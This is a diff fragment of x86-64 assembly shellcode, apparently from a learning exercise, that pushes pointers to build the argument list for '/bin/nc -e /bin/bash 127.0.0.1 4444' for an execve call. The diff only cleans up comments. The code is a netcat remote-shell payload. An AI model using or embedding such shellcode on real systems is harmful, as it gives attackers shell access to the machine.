@@ -49,11 +49,11 @@ _start:
     ; prepare second argument of execve in RSI
 
     push rax                ; NULL byte
-    push r9 ;444            ; ptr to 4444
-    push r8 ;ip             ; ptr to 127.0.0.1
-    push rdx ;binbash       ; ptr to /bin/bash
-    push rcx ;-e            ; ptr to -e
-    push rbx ;nc            ; ptr to /bin/nc
+    push r9                 ; ptr to 4444
+    push r8                 ; ptr to 127.0.0.1
+    push rdx                ; ptr to /bin/bash
+    push rcx                ; ptr to -e
+    push rbx                ; ptr to /bin/nc
     mov rsi, rsp            ; ptr to args
 
     ; prepare third argument of execve in RDX that is NULL
